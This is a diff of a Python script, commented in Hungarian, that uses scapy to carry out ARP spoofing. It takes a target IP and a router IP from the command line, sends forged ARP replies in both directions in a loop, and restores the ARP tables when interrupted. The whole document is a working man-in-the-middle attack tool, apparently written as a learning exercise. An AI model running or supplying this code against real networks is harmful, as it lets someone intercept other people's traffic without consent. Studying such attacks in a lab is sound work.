@@ -1,8 +1,20 @@
+import argparse
 import time
 import scapy.all as scapy
 
 
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", help="target IP")
+    parser.add_argument("-s", "--source", dest="source", help="source IP (router)")
+    option = parser.parse_args()
+    if not option.target:
+        parser.error('[-] Add meg a cél gép és a router IP címét. Használd a --help parancsot több infóért.')
+    return option
+
+
 def get_mac(ip):
+    # az ip cím alapján visszaadja a hozz átartozó MAC addresst
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
@@ -16,14 +28,28 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
+def restore(destination_ip, source_ip):
+    # visszaállítja a cél és forrás ip-ket alaphelyzetbe
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False, count=4)  # a count argumentum azt jelenti,
+                                                # hogy 4x küldjük el a csomagot, hogy biztos legyen
+
+
+argument = get_arguments()
+target = argument.target
+source = argument.source
 sent_packets_count = 0
 
-try:
-    while True:
-        spoof('192.168.181.158', '192.168.181.2')
-        spoof('192.168.181.2', '192.168.181.158')
+while True:
+    try:
+        spoof(target, source)
+        spoof(source, target)
         sent_packets_count += 2
         print(f"\r[+] Packet sent: {sent_packets_count}", end="")
         time.sleep(2)
-except KeyboardInterrupt:
-    print("[+]  Detected CTRL + C...exit.")
+    except KeyboardInterrupt:
+        print("\n[-]  Detected CTRL + C...Resetting ARP tables.")
+        restore(target, source)
+        break
